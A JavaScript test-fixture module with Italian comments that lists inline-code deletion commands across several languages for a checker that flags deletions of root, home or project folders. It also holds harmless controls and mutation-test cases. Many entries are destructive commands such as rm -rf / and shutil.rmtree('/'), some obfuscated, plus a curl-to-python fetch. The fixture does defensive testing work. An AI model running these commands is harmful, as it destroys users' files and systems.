/*
 * I casi della voce S1 della 0.2.4 (le cancellazioni scritte in un altro linguaggio), in comune fra la prova
 * `cancellazioni-in-un-altro-linguaggio.test.mjs` e il giro dei mutanti. Solo testo: niente qui si esegue.
 * Bersagli: solo i percorsi FINTI dei contesti `U` e `W`, la radice scritta come testo, mai «..».
 */
export const U = { cartella: '/finto/casa/lavoro/progetto', home: '/finto/casa', piattaforma: 'linux', ambiente: { HOME: '/finto/casa' }, realpathFn: (p) => p }
export const W = { cartella: 'C:\\finto\\casa\\lavoro\\progetto', home: 'C:\\finto\\casa', piattaforma: 'win32', ambiente: { USERPROFILE: 'C:\\finto\\casa' }, realpathFn: (p) => p }

/* ───────────── le forme che devono chiedere (macOS e telefono leggono come Linux) ───────────── */

export const PYTHON = [
  [`python -c "import shutil; shutil.rmtree('/')"`, 'radice'],
  [`python3 -c "import shutil; shutil.rmtree('/finto/casa')"`, 'casa'],
  [`python3.12 -c "import shutil as s; s.rmtree('/finto/casa/lavoro/progetto')"`, 'progetto'],
  [`py -3 -c "import shutil,os; shutil.rmtree(os.path.expanduser('~'))"`, 'casa'],
  [`python -c "from shutil import rmtree; rmtree('/finto')"`, 'primo-livello'],
  [`python -c "import os; os.system('rm -rf /finto/casa')"`, 'casa'],
  [`python3 -c "import subprocess; subprocess.run(['rm', '-rf', '/finto/casa'])"`, 'casa'],
  [`python3 -c "import subprocess; subprocess.call('rm -rf /', shell=True)"`, 'radice'],
  [`python -c "import pathlib; pathlib.Path('/finto/casa/lavoro/progetto').rmdir()"`, 'progetto'],
  [`python -c "import shutil; shutil.rmtree('.')"`, 'progetto'],
  [`python -c "import shutil, os; shutil.rmtree(os.getcwd())"`, 'progetto'],
  [`python -c "import shutil, pathlib; shutil.rmtree(pathlib.Path.home())"`, 'casa'],
  [`python -c "import shutil, os; shutil.rmtree(os.path.join(os.environ['HOME'], 'lavoro'))"`, 'sopra-il-progetto'],
  [`python -Ic "import shutil; shutil.rmtree('/')"`, 'radice'],
  [`python -c'import shutil; shutil.rmtree("/")'`, 'radice'],
  [`python -W ignore -c "import shutil; shutil.rmtree('/')"`, 'radice'],
  [`python -c "exec('import shutil; shutil.rmtree(\\'/\\')')"`, 'radice'],
  [`/usr/bin/python3 -c "import shutil; shutil.rmtree('/')"`, 'radice'],
  [`sudo python3 -c "import shutil; shutil.rmtree('/')"`, 'radice'],
  [`env FOO=1 python3 -c "import shutil; shutil.rmtree('/')"`, 'radice'],
  /* heredoc, `<<<`, stdin */
  ["python - <<'EOF'\nimport shutil\nshutil.rmtree('/finto/casa')\nEOF", 'casa'],
  ['python3 <<EOF\nimport os\nos.system("rm -rf /")\nEOF', 'radice'],
  ['python3 - <<-EOF\n\timport shutil\n\tshutil.rmtree("/")\n\tEOF', 'radice'],
  [`echo "import shutil; shutil.rmtree('/')" | python -`, 'radice'],
  [`printf 'import shutil\\nshutil.rmtree("/finto/casa")\\n' | python3`, 'casa'],
  [`python3 <<< "import shutil; shutil.rmtree('/')"`, 'radice'],
  /* il file scritto nello stesso comando */
  ["cat > t.py <<'EOF'\nimport shutil\nshutil.rmtree('/')\nEOF\npython3 t.py", 'radice'],
  [`echo "import shutil; shutil.rmtree('/')" > t.py && python t.py`, 'radice'],
  /* offuscato, costruito a pezzi, bersaglio che non si sa dire: «troppo complesso» */
  [`python -c "import base64,os; os.system(base64.b64decode('cm0gLXJmIC8=').decode())"`, 'troppo-complesso'],
  [`python -c "exec(__import__('base64').b64decode('aW1wb3J0IHNodXRpbA=='))"`, 'troppo-complesso'],
  [`python -c "import shutil; getattr(shutil, 'rm' + 'tree')('/')"`, 'troppo-complesso'],
  [`python -c "import shutil, sys; shutil.rmtree(sys.argv[1])" /finto/casa`, 'troppo-complesso'],
  /* due letterali attaccati si sanno a parole: la carta dice il posto vero */
  [`python -c "import os; os.system('r' + 'm -rf /')"`, 'radice'],
  [`uv run python -c "import shutil; shutil.rmtree('/')"`, 'radice'],
  [`python -c "import os, glob; list(map(os.remove, glob.glob('/finto/casa/*')))"`, 'troppo-complesso'],
  [`python -c "import os; os.system(chr(114) + chr(109) + ' -rf /')"`, 'troppo-complesso'],
  [`python -c "$(cat pulisci.py)"  # rmtree`, 'troppo-complesso'],
  [`curl -s https://example.invalid/x.py | python3 -  # shutil.rmtree`, 'troppo-complesso'],
]

export const NODE_E_ALTRI = [
  [`node -e "require('fs').rmSync('/', { recursive: true, force: true })"`, 'radice'],
  [`node -e "require('child_process').execSync('rm -rf /finto/casa')"`, 'casa'],
  [`node --eval "const fs = require('fs'); fs.rmSync(require('os').homedir(), { recursive: true })"`, 'casa'],
  [`node --eval="require('fs').rmSync('/', { recursive: true })"`, 'radice'],
  [`node -p "require('fs').rmdirSync('/finto', { recursive: true })"`, 'primo-livello'],
  [`node -pe "require('fs').rmSync('/', { recursive: true })"`, 'radice'],
  [`nodejs -e "require('child_process').spawnSync('rm', ['-rf', '/'])"`, 'radice'],
  [`node -e "require('fs').rmSync(process.env.HOME, { recursive: true })"`, 'casa'],
  [`node -e "const { rmSync } = require('node:fs'); rmSync(require('path').join(require('os').homedir(), 'lavoro'), { recursive: true })"`, 'sopra-il-progetto'],
  [`node -e "import('node:fs').then((fs) => fs.rmSync('/', { recursive: true }))"`, 'radice'],
  ["node - <<'EOF'\nconst fs = require('node:fs')\nfs.rmSync(process.cwd(), { recursive: true })\nEOF", 'progetto'],
  [`node -e "eval(Buffer.from('cmVxdWlyZQ==', 'base64').toString())"`, 'troppo-complesso'],
  [`node -e "require('fs').rmSync(process.argv[1], { recursive: true })" /finto/casa`, 'troppo-complesso'],
  [`node -e "require('child_process').execSync('rm -rf ' + process.argv[1])" x`, 'troppo-complesso'],
  /* perl */
  [`perl -e "system(q(rm -rf ~))"`, 'casa'],
  [`perl -e "system(q(rm -rf /finto/casa))"`, 'casa'],
  [`perl -MFile::Path=rmtree -e 'rmtree("/")'`, 'radice'],
  [`perl -e 'use File::Path qw(remove_tree); remove_tree("/finto/casa")'`, 'casa'],
  [`perl -le 'system "rm", "-rf", "/finto/casa"'`, 'casa'],
  [`perl -e 'unlink glob("/finto/casa/*")'`, 'casa'],
  ["perl <<'EOF'\nuse File::Path;\nrmtree('/');\nEOF", 'radice'],
  [`perl -e 'rmtree($ENV{HOME})'`, 'casa'],
  [`perl -e 'eval pack("H*", "726d202d7266202f")'`, 'troppo-complesso'],
  [`perl -e 'my $d = shift; rmtree($d)' /finto/casa`, 'troppo-complesso'],
  /* ruby */
  [`ruby -e "require 'fileutils'; FileUtils.rm_rf('/')"`, 'radice'],
  [`ruby -rfileutils -e 'FileUtils.rm_rf(Dir.home)'`, 'casa'],
  [`ruby -e 'system("rm -rf /finto/casa")'`, 'casa'],
  [`ruby -e '%x(rm -rf /)'`, 'radice'],
  [`ruby -e 'FileUtils.remove_dir ENV["HOME"]'`, 'casa'],
  [`ruby -e 'eval(Base64.decode64("cm0gLXJmIC8="))'`, 'troppo-complesso'],
  /* php */
  [`php -r "system('rm -rf /');"`, 'radice'],
  [`php -r 'shell_exec("rm -rf /finto/casa");'`, 'casa'],
  [`php -r 'rmdir("/finto/casa/lavoro/progetto");'`, 'progetto'],
  /* bun */
  [`bun -e "require('fs').rmSync('/', { recursive: true })"`, 'radice'],
  [`bun --eval "Bun.spawnSync(['rm', '-rf', '/'])"`, 'radice'],
  ['bun -e "await Bun.$\\`rm -rf /finto/casa\\`"', 'casa'],
  /* deno */
  [`deno eval "Deno.removeSync('/', { recursive: true })"`, 'radice'],
  [`deno eval "await Deno.remove(Deno.env.get('HOME'), { recursive: true })"`, 'casa'],
  [`deno eval "new Deno.Command('rm', { args: ['-rf', '/'] }).outputSync()"`, 'radice'],
  [`deno -q eval -p "Deno.removeSync('/finto/casa', { recursive: true })"`, 'casa'],
  /* dentro un'altra shell */
  [`sh -c "python3 -c \\"import shutil; shutil.rmtree('/')\\""`, 'radice'],
  [`bash -lc 'node -e "require(\\"fs\\").rmSync(\\"/finto/casa\\", { recursive: true })"'`, 'casa'],
  [`bash -c "perl -e 'rmtree(\\"/\\")'"`, 'radice'],
]

export const DI_WINDOWS = [
  [`python -c "import shutil; shutil.rmtree('C:\\\\')"`, 'radice'],
  [`python.exe -c "import shutil; shutil.rmtree('C:/finto/casa')"`, 'casa'],
  [`C:\\Python312\\python.exe -c "import shutil; shutil.rmtree(r'C:\\finto\\casa')"`, 'casa'],
  [`py -3.12 -c "import shutil, os; shutil.rmtree(os.environ['USERPROFILE'])"`, 'casa'],
  [`node.exe -e "require('fs').rmSync('C:\\\\finto\\\\casa', { recursive: true })"`, 'casa'],
  [`cmd /c python -c "import shutil; shutil.rmtree('C:/')"`, 'radice'],
  [`powershell -Command "python -c 'import shutil; shutil.rmtree(''C:/finto/casa'')'"`, '*'],
  [`powershell -Command "node -e 'require(\\"fs\\").rmSync(\\"C:/finto/casa\\", { recursive: true })'"`, '*'],
  ["python - <<'EOF'\nimport shutil\nshutil.rmtree('C:/finto/casa')\nEOF", 'casa'],
  [`echo import shutil; shutil.rmtree('C:/') | python -`, '*'],
  [`perl -e "system(q(rd /s /q C:\\finto\\casa))"`, 'casa'],
  [`ruby -e "FileUtils.rm_rf('C:/finto/casa')"`, 'casa'],
  [`deno eval "Deno.removeSync('C:/finto', { recursive: true })"`, 'primo-livello'],
]

/* ───────────── i 20 innocui d'uso comune (decisione 375): nessuna carta critica, prima e dopo ───────────── */

export const INNOCUI = [
  `python -c "print(1)"`,
  `python3 -c "import sys; print(sys.version)"`,
  `node -e "console.log(process.version)"`,
  "python - <<'EOF'\nimport json\nprint(json.load(open('package.json'))['name'])\nEOF",
  `perl -pe 's/a/b/' file.txt`,
  `ruby -e 'puts 1'`,
  `deno eval "1+1"`,
  `node -p "require('./package.json').version"`,
  `python3 -m http.server 8000`,
  `perl -ne 'print if /TODO/' src/a.c`,
  `perl -i -pe 's/foo/bar/g' README.md`,
  `bun -e "console.log(Bun.version)"`,
  `php -r 'echo PHP_VERSION;'`,
  `python -c "import os; print(os.getcwd())"`,
  `node -e "const fs = require('fs'); console.log(fs.readdirSync('.').length)"`,
  `python -c "import shutil; print(shutil.which('git'))"`,
  `echo '{"a":1}' | python -m json.tool`,
  `node -e "require('child_process').execSync('git status', { stdio: 'inherit' })"`,
  `python3 -c "import subprocess; subprocess.run(['npm', 'test'], check=True)"`,
  `ruby -rjson -e 'puts JSON.parse(File.read("x.json"))["a"]'`,
]

/* le cancellazioni d'ogni giorno, in un altro linguaggio, di cartelle NON critiche: nessuna carta, come `rm -rf dist` */
export const NON_CRITICHE = [
  `node -e "require('fs').rmSync('dist', { recursive: true, force: true })"`,
  `python -c "import shutil; shutil.rmtree('build', ignore_errors=True)"`,
  `python3 -c "import os; os.remove('out.txt')"`,
  `perl -e 'unlink "a.tmp"'`,
  `ruby -e 'FileUtils.rm_rf("tmp/cache")'`,
  `deno eval "Deno.removeSync('coverage', { recursive: true })"`,
  `python -c "import subprocess; subprocess.run(['rm', '-rf', 'node_modules'])"`,
  `node -e "require('child_process').execSync('rm -rf .cache')"`,
]

/* uno script che non nasce nel comando non si legge; un testo fra virgolette non è codice */
export const NON_SI_LEGGONO = ['python build.py', 'node scripts/pulisci.mjs', 'echo "python -c print(1)"', 'git commit -m "use shutil.rmtree in cleanup"', 'grep -rn rmtree src']

/* `'bash -c "…"'` annidato n volte, con le fughe vere di POSIX (come `cancellazioni-critiche-cure.test.mjs`) */
const nido = (s, n) => { for (let i = 0; i < n; i += 1) s = `bash -c "${s.replace(/[\\"$`]/gu, (x) => `\\${x}`)}"`; return s }
const apici = (s) => `'${s.replace(/'/gu, "'\\''")}'`
/* python → os.system → python → os.system → python: oltre il tetto di annidamento si fallisce chiusi */
const catena = (() => {
  let codice = "import shutil; shutil.rmtree('/')"
  for (let i = 0; i < 2; i += 1) codice = `import os; os.system(${JSON.stringify(`python3 -c ${apici(codice)}`)})`
  return `python3 -c ${apici(codice)}`
})()

/*
 * Il giro dei mutanti (18/11/2026): i casi che chiudono i mutanti sopravvissuti del primo giro, uno per ramo della lettura
 * (commenti, stringhe calcolate, `q()`/`%w()`, opzioni col valore, redirezioni, tetti). `null` = nessuna carta.
 */
export const DAI_MUTANTI = [
  /* commenti: ciò che sta in un commento non si esegue; il codice dopo sì */
  [`node -e "/* require('fs').rmSync('/') */ console.log(1)"`, null],
  ["php -r '// unlink(\"/finto/casa\");\necho 1;'", null],
  [`python -c "print(1)  # shutil.rmtree('/')"`, null],
  [`python -c "import shutil; shutil.rmtree('/') # fatto"`, 'radice'],
  ["python -c \"# shutil.rmtree('/')\nprint(1)\"", null],
  [`perl -e 'print $#ARGV; rmtree("/")'`, 'radice'],
  /* stringhe calcolate e non chiuse */
  [`python -c "import shutil; shutil.rmtree(f'/{x}')"`, 'troppo-complesso'],
  [`python -c "import shutil; shutil.rmtree('/{x}')"`, 'primo-livello'],
  [`python -c "import shutil; shutil.rmtree('/"`, 'troppo-complesso'],
  ['node -e \'require("fs").rmSync(`/${x}`, { recursive: true })\'', 'troppo-complesso'],
  ['node -e \'require("fs").rmSync(`/finto/casa`, { recursive: true })\'', 'casa'],
  [`node -e 'console.log($("rm -rf /"))'`, null],
  [`perl -e 'rmtree("@x/finto")'`, 'troppo-complesso'],
  ['perl -e \'my $d = shift; print `rm -rf $d`\'', 'troppo-complesso'],
  [`perl -e 'rmtree(q(/finto/casa'`, 'troppo-complesso'],
  /* q, qq, qw, qx di perl; %q, %w, %Q di ruby */
  [`perl -e 'rmtree(q{/finto/casa})'`, 'casa'],
  [`perl -e 'system qw(rm -rf /finto/casa)'`, 'casa'],
  [`perl -e 'print qx{rm -rf /}'`, 'radice'],
  [`perl -e 'rmtree(qq{$ENV{HOME}})'`, 'casa'],
  /* giro 2 (punto 6): `q{…}` non interpola: è la cartella di nome «$ENV{HOME}»; la shell con `rm -rf '$ENV{HOME}'` non dà la carta, qui lo stesso */
  [`perl -e 'rmtree(q{$ENV{HOME}})'`, null],
  [`perl -e 'system"rm -rf /"'`, 'radice'],
  [`perl -e 'for (1) { unlink "/finto/casa" }'`, 'casa'],
  [`perl -e 'unlink "/finto/casa" if 1'`, 'casa'],
  [`perl -e 'unlink()'`, 'troppo-complesso'],
  [`perl -e 'rmtree($ENV{HOME} . "/lavoro")'`, 'sopra-il-progetto'],
  [`ruby -e 'FileUtils.rm_rf(%q(/finto/casa))'`, 'casa'],
  [`ruby -e 'FileUtils.rm_rf %w(/finto/casa)'`, 'casa'],
  [`ruby -e 'puts %Q(#{Dir.home}); FileUtils.rm_rf("/finto")'`, 'primo-livello'],
  [`ruby -e 'FileUtils.rm_rf(Dir["/finto/casa"])'`, 'casa'],
  ['ruby -e \'FileUtils.rm_rf(`echo /`)\'', 'troppo-complesso'],
  /* opzioni col valore, opzioni che fermano, più codici */
  [`deno -L debug eval "Deno.removeSync('/', { recursive: true })"`, 'radice'],
  [`deno eval --ext ts "Deno.removeSync('/', { recursive: true })"`, 'radice'],
  [`deno -e "Deno.removeSync('/', { recursive: true })"`, 'radice'],
  [`deno --eval="Deno.removeSync('/', { recursive: true })"`, 'radice'],
  ["deno run - <<'EOF'\nDeno.removeSync('/finto/casa', { recursive: true })\nEOF", 'casa'],
  [`deno run x.ts`, null],
  [`python -m json.tool -c "import shutil; shutil.rmtree('/')"`, null],
  [`python --check-hash-based-pycs always -c "import shutil; shutil.rmtree('/')"`, 'radice'],
  [`python -c "print(1)" -c "import shutil; shutil.rmtree('/')"`, null],
  [`node --require ./x.js -e "require('fs').rmSync('/', { recursive: true })"`, 'radice'],
  [`node -r ./x.js -e "require('fs').rmSync('/', { recursive: true })"`, 'radice'],
  [`node --input-type=module -e "require('fs').rmSync('/', { recursive: true })"`, 'radice'],
  [`bun -pe "require('fs').rmSync('/', { recursive: true })"`, 'radice'],
  [`perl -I lib -e 'rmtree("/")'`, 'radice'],
  [`perl -i.bak -e 'rmtree("/")'`, 'radice'],
  [`php -d x=1 -r 'unlink("/");'`, 'radice'],
  [`ruby -r fileutils -e 'FileUtils.rm_rf("/")'`, 'radice'],
  [`echo "import shutil; shutil.rmtree('/')" | python -m json.tool`, null],
  /* redirezioni e file scritti */
  ["cat > t.py <<'EOF'\nimport shutil\nshutil.rmtree('/')\nEOF\npython3 < t.py", 'radice'],
  ["cat > t.py <<'EOF'\nimport shutil\nshutil.rmtree('/')\nEOF\npython3 -- t.py", 'radice'],
  [`python3 < altro.py`, null],
  [`echo "import shutil; shutil.rmtree('/')" >t.py; python t.py`, 'radice'],
  [`echo hi > t.py; python t.py`, null],
  [`python3 <<<'import shutil; shutil.rmtree("/")'`, 'radice'],
  [`cat x.py | python3`, null],
  [`cat x.py | python3  # rmtree`, 'troppo-complesso'],
  ["python3 -c 'print(1)' <<'EOF'\nimport shutil\nshutil.rmtree('/')\nEOF", null],
  /* guscio e cancellazioni: chiamata o no, ricevitore, opzioni */
  [`python -c "import os; f = os.system; print('rm')"`, null],
  [`python -c "import subprocess; subprocess.run(['rm', '-rf', d])"`, 'troppo-complesso'],
  [`deno eval "new Deno.Command('rm', { args: ['-rf', x] }).outputSync()"`, 'troppo-complesso'],
  [`python -c "import pathlib; f = pathlib.Path('/').unlink; print(f)"`, null],
  [`python -c "import os; os.rmdir('build')"`, null],
  [`python -c "import shutil; mod.Path('/').unlink()"`, 'troppo-complesso'],
  [`python -c "import shutil; shutil.rmtree(('/'))"`, 'radice'],
  [`python -c "import shutil, pathlib; shutil.rmtree(pathlib.Path.home() / 'lavoro')"`, 'sopra-il-progetto'],
  [`node -e "rm('/')"`, null],
  [`node -e "const { rm } = require('node:fs/promises'); rm('/', { recursive: true })"`, 'radice'],
  /* giro 2 (punto 6): come `rm -rf https://x.example/y` nella shell, che non dà la carta (il posto non si sa dire) */
  [`node -e "require('fs').rmSync('https://x.example/y', { recursive: true })"`, null],
  /* tetti: troppe chiamate, troppi bersagli, troppo annidato */
  [`python3 -c "import shutil; ${'shutil.rmtree(\'build\'); '.repeat(300)}"`, 'troppo-annidato'],
  [`perl -e 'unlink qw(${'a '.repeat(3500)})'`, 'troppo-annidato'],
  [catena, 'troppo-annidato'],
  [nido(`python3 -c "import shutil; shutil.rmtree('/')"`, 5), 'troppo-annidato'],
]

/* ───────────── giro 2 (giudice v2186): i tentativi del revisore che la forma dichiarava coperti, e i suoi mutanti vivi ───────────── */

export const GIRO_2 = [
  /* R1: un nome scelto mentre gira che nomina ciò che cancella (forma r.32) */
  [`python -c "import shutil; getattr(shutil,'rmtree')('/')"`, 'troppo-complesso'],
  [`python -c "import shutil; getattr(shutil, 'rmtree')('/finto/casa')"`, 'troppo-complesso'],
  [`python -c "import os; getattr(os, 'system')('rm -rf /')"`, 'troppo-complesso'],
  [`python -c "import shutil; m = input(); getattr(shutil, m)('/')"`, 'troppo-complesso'],
  [`python -c "import os; vars(os)['system']('rm -rf /')"`, 'troppo-complesso'],
  [`ruby -e 'FileUtils.send("rm_rf", "/")'`, 'troppo-complesso'],
  [`ruby -e 'Kernel.send(:system, "rm -rf /")'`, 'troppo-complesso'],
  [`ruby -rfileutils -e 'FileUtils.public_send(:rm_rf, "/")'`, 'troppo-complesso'],
  [`ruby -e 'method(:system).call("rm -rf /")'`, 'troppo-complesso'],
  [`ruby -e 'FileUtils.send(ARGV[0], "/")' rm_rf`, 'troppo-complesso'],
  [`node -e "const fs=require('fs'); fs['rmSync']('/',{recursive:true})"`, 'troppo-complesso'],
  [`perl -e 'my $f="unlink"; &$f("/finto/casa")'`, 'troppo-complesso'],
  [`php -r '$f="unlink"; $f("/finto/casa");'`, 'troppo-complesso'],
  [`php -r 'call_user_func("system", "rm -rf /");'`, 'troppo-complesso'],
  [`php -r 'array_map("unlink", glob("/finto/casa/*"));'`, 'troppo-complesso'],
  /* R2: le fughe dei letterali si decodificano prima di leggere (python, js, perl e ruby fra doppie, php fra doppie) */
  [`python -c "import os; os.system('\\x72\\x6d -rf /finto/casa')"`, 'casa'],
  [`python -c "import shutil; shutil.rmtree('\\x2f')"`, 'radice'],
  [`python -c "import shutil; shutil.rmtree('\\u002ffinto')"`, 'primo-livello'],
  [`python -c "import shutil; shutil.rmtree('\\U0000002f')"`, 'radice'],
  [`python -c "import shutil; shutil.rmtree('\\057')"`, 'radice'],
  [`python -c "import shutil; shutil.rmtree('\\N{SOLIDUS}')"`, 'troppo-complesso'],
  [`python -c "import shutil; shutil.rmtree(r'\\x2f')"`, null],
  [`node -e "require('child_process').execSync('\\x72m -rf /')"`, 'radice'],
  [`node -e "require('fs').rmSync('\\u002f',{recursive:true})"`, 'radice'],
  [`node -e "require('fs').rmSync('\\u{2f}finto/casa',{recursive:true})"`, 'casa'],
  [`node -e "require('fs').\\u0072mSync('/',{recursive:true})"`, 'radice'],
  [`perl -e 'system("\\x72m -rf /")'`, 'radice'],
  [`perl -e 'rmtree("\\x{2f}")'`, 'radice'],
  [`perl -e 'rmtree("\\057finto")'`, 'primo-livello'],
  [`perl -e 'rmtree("\\Ufinto")'`, 'troppo-complesso'],
  [`perl -e 'rmtree(q{\\x2f})'`, null],
  [`ruby -e 'FileUtils.rm_rf("\\u{2f}")'`, 'radice'],
  [`ruby -e 'FileUtils.rm_rf("\\x2ffinto/casa")'`, 'casa'],
  [`php -r 'rmdir("\\x2ffinto/casa/lavoro/progetto");'`, 'progetto'],
  [`php -r 'rmdir("\\u{2f}");'`, 'radice'],
  [`php -r "rmdir('\\x2f');"`, null],
  /* R3: fs-extra seguito col nome a cui è legato */
  [`node -e "require('fs-extra').remove('/')"`, 'radice'],
  [`node -e "const fs=require('fs-extra'); fs.remove('/')"`, 'radice'],
  [`node -e "const x = require('fs-extra'); x.emptyDir('/finto/casa')"`, 'casa'],
  [`node -e "const fs=require('fs-extra'); fs.emptyDirSync('/finto/casa')"`, 'casa'],
  [`node -e "require('fs-extra').removeSync('/')"`, 'radice'],
  [`node --input-type=module -e "import fs from 'fs-extra'; await fs.remove('/finto/casa')"`, 'casa'],
  [`node --input-type=module -e "import * as q from 'fs-extra'; await q.emptyDir('/')"`, 'radice'],
  [`node --input-type=module -e "import { remove as via } from 'fs-extra'; await via('/')"`, 'radice'],
  [`node -e "const { emptyDir: e } = require('fs-extra'); e('/finto/casa')"`, 'casa'],
  [`node -e "import('fs-extra').then((m) => m.remove('/'))"`, 'radice'],
  [`node -e "const fs=require('fs-extra'); fs.remove('dist')"`, null],
  /* nessun tetto sui nomi da aggirare: settanta legami, cancella l'ultimo */
  [`node --input-type=module -e "${Array.from({ length: 70 }, (_, i) => `import f${i} from 'fs-extra';`).join(' ')} await f69.remove('/')"`, 'radice'],
  /* R4: oltre il tetto di annidamento si fallisce chiusi in ogni lingua */
  [nido(`node -e "require('fs').rm('/',{recursive:true,force:true},()=>{})"`, 3), 'radice'],
  [nido(`node -e "require('fs').rm('/',{recursive:true,force:true},()=>{})"`, 4), 'troppo-annidato'],
  [nido(`node -e "require('fs').rm('/',{recursive:true,force:true},()=>{})"`, 5), 'troppo-annidato'],
  [nido(`node -e "require('fs-extra').remove('/')"`, 4), 'troppo-annidato'],
  [nido(`ruby -e 'FileUtils.rm_rf("/")'`, 5), 'troppo-annidato'],
  [nido(`php -r 'system("rm -rf /");'`, 5), 'troppo-annidato'],
  [nido(`node -e "console.log(1)"`, 5), null],
  /* punto 5: le righe dove un mutante del revisore toglieva una carta senza che una prova se ne accorgesse */
  [`node --eval "console.log(1)" --eval "require('fs').rmSync('/',{recursive:true})"`, 'radice'], // r.1549
  ['node -e "require(\'child_process\').execSync(`rm -rf ${d}`)"', 'troppo-complesso'], // r.1656
  [`python -c "q('('); import shutil; shutil.rmtree('/')"`, 'radice'], // r.1669
  [`py -V:ContinuumAnalytics/Anaconda39-64 -c "import shutil; shutil.rmtree('/')"`, 'radice'], // r.1543
  [`printf '# x\\nimport shutil; shutil.rmtree("/")' | python3`, 'radice'], // r.2088
  [`python -c "import subprocess; subprocess.run(args='rm -rf /', shell=True)"`, 'troppo-complesso'], // r06 del revisore
  [`printf '# x\\nimport shutil; shutil.rmtree("/")' > t.py; python3 t.py`, 'radice'], // r08 del revisore
  /* il percorso col suo nome; i letterali vicini */
  [`python -c "import shutil; shutil.rmtree(path='/')"`, 'radice'],
  /* un valore fatto da una chiamata: senza argomenti è come `$(mktemp -d)` (niente carta), con argomenti o un posto nominato no */
  [`python -c "import os, shutil; d = os.path.abspath(os.sep); shutil.rmtree(d)"`, 'troppo-complesso'],
  [`python -c "import pwd, os, shutil; d = pwd.getpwuid(os.getuid()).pw_dir; shutil.rmtree(d)"`, 'troppo-complesso'],
  [`python -c "import shutil, pathlib; d = pathlib.Path.home().parent; shutil.rmtree(d)"`, 'troppo-complesso'],
  [`python -c "import shutil, tempfile; d = tempfile.mkdtemp(dir='/'); shutil.rmtree(d)"`, 'troppo-complesso'],
  [`python -c "import shutil; shutil.rmtree(d)"`, 'troppo-complesso'],
  [`python -c "import shutil; d, e = '/', 'x'; shutil.rmtree(d)"`, 'troppo-complesso'],
  [`python -c "import shutil; d = '/fin'; d += 'to'; shutil.rmtree(d)"`, 'troppo-complesso'],
  [`python -c "import shutil; d = '/'; d = 'build'; shutil.rmtree(d)"`, 'radice'],
  [`python -c "import os; c = 'rm -rf /'; os.system(c)"`, 'radice'],
  [`python -c "import os; c = input(); os.system(c)  # rm -rf"`, 'troppo-complesso'],
  [`python -c "import shutil; exec(c)"`, 'troppo-complesso'],
  [`python -c "import os; os.system('r' 'm -rf /')"`, 'radice'],
  [`python -c "import shutil; shutil.rmtree('/fin' 'to/casa')"`, 'casa'],
]

/*
 * Punto 6 (giudice v2186): per lo stesso bersaglio il codice in linea risponde come la shell. Ogni riga: il codice, la stessa cosa scritta
 * in shell, ciò che danno tutte e due (`null` = nessuna carta). I primi quattro sono i «troppo complesso» nuovi trovati dal revisore.
 */
export const PARI_ALLA_SHELL = [
  [`python -c "import tempfile,shutil; d=tempfile.mkdtemp(); shutil.rmtree(d)"`, `d=$(mktemp -d); rm -rf "$d"`, null],
  [`python -c "import glob,os; [os.remove(f) for f in glob.glob('*.pyc')]"`, `for f in *.pyc; do rm "$f"; done`, null],
  [`node -e "require('fs').rmSync(require('path').join(__dirname,'dist'),{recursive:true,force:true})"`, `rm -rf ./dist`, null],
  ["python3 - <<'EOF'\nimport shutil, pathlib\nfor p in pathlib.Path('.').glob('**/__pycache__'):\n    shutil.rmtree(p)\nEOF", `find . -name __pycache__ -exec rm -rf {} +`, null],
  [`python -c "import shutil; d = '/finto/casa'; shutil.rmtree(d)"`, `D=/finto/casa; rm -rf "$D"`, 'casa'],
  [`python -c "import shutil; [shutil.rmtree(d) for d in ['build', '/']]"`, `for d in build /; do rm -rf "$d"; done`, 'radice'],
  [`node -e "['build', '/'].forEach((d) => require('fs').rmSync(d, { recursive: true }))"`, `for d in build /; do rm -rf "$d"; done`, 'radice'],
  [`ruby -rtmpdir -e 'Dir.mktmpdir do |d| FileUtils.rm_rf(d) end'`, `d=$(mktemp -d); rm -rf "$d"`, null],
  [`ruby -e 'Dir.glob("*.o").each do |f| File.delete(f) end'`, `for f in *.o; do rm "$f"; done`, null],
  [`perl -e 'my $d = "/finto/casa"; rmtree($d)'`, `D=/finto/casa; rm -rf "$D"`, 'casa'],
  [`php -r 'foreach (["build", "/"] as $d) { rmdir($d); }'`, `for d in build /; do rm -rf "$d"; done`, 'radice'],
  [`node -e "require('fs').rmSync('https://x.example/y', { recursive: true })"`, `rm -rf https://x.example/y`, null],
  [`python -c "import shutil, os; shutil.rmtree(os.environ['BUILD_DIR'])"`, `rm -rf "$BUILD_DIR"`, null],
  [`python -c "import shutil, os; shutil.rmtree(os.environ['NONCE'] + '/')"`, `rm -rf "$NONCE/"`, 'radice'],
  [`python -c "import shutil, tempfile; d = tempfile.mkdtemp(); shutil.rmtree('/' + d)"`, `d=$(mktemp -d); rm -rf "/$d"`, null],
  [`cd $X && python -c "import shutil; shutil.rmtree('x')"`, `cd $X && rm -rf x`, 'sostituzione'],
]

/* giro 2, su Windows: python tiene la barra di una fuga che non conosce (`\W`), js la toglie (docs.python.org 2.4.1; ECMA-262) */
export const MUTANTI_GIRO_2_W = [
  [`python -c "import shutil; shutil.rmtree('C:\\Windows')"`, 'primo-livello'],
  [`node -e "require('fs').rmSync('C:\\Windows', { recursive: true })"`, null],
]

/* giro 2: un caso per ogni ramo nuovo che il primo giro dei mutanti ha lasciato vivo (righe in `mutanti-g2.txt` del lavoro) */
export const MUTANTI_GIRO_2 = [
  /* le fughe: barra davanti a un carattere qualsiasi (js la toglie, python e php la tengono), ottali per lingua, cifre che mancano */
  [`node -e "require('fs').rmSync('\\/', { recursive: true })"`, 'radice'],
  [`php -r 'rmdir("\\457");'`, 'radice'],
  [`node -e "require('fs').rmSync('\\457', { recursive: true })"`, null],
  [`python -c "import shutil; shutil.rmtree('\\457')"`, null],
  [`ruby -e 'FileUtils.rm_rf("\\457")'`, 'troppo-complesso'],
  [`python -c "import shutil; shutil.rmtree('/\\x2g')"`, 'troppo-complesso'],
  [`python -c "import shutil; shutil.rmtree('\\UFFFFFFFF')"`, 'troppo-complesso'],
  [`perl -e 'rmtree("\\o{57}")'`, 'troppo-complesso'],
  [`perl -e 'rmtree("/\\cJ")'`, 'troppo-complesso'],
  [`perl -e 'rmtree("/#{x}")'`, 'primo-livello'],
  ['ruby -e \'`rm -rf $HOME`\'', 'casa'],
  ['perl -e \'print `rm -rf $ENV{HOME}`\'', 'casa'],
  /* letterali vicini e liste di perl */
  [`python -c "import shutil; shutil.rmtree('/fin' f'{x}')"`, 'troppo-complesso'],
  [`perl -e 'my @d = ("/finto/casa"); rmtree(@d)'`, 'casa'],
  /* opzioni, profondità, argomenti che non si leggono */
